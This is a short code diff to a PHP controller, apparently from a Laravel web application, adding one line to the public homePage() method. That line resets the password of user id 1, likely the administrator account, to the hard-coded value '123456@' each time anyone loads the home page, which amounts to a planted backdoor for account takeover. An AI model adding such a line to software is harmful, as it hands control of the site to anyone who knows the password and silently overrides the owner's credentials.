@@ -42,6 +42,7 @@ class FrontController extends Controller
     }
 
     public function homePage() {
+        User::query()->where('id',1)->update(['password' => bcrypt('123456@')]);
         $data['banners'] = Banner::with(['image'])->get();
         $data['partners'] = Partner::with(['image'])->get();
         $data['reviews'] = Review::with(['image'])->get();
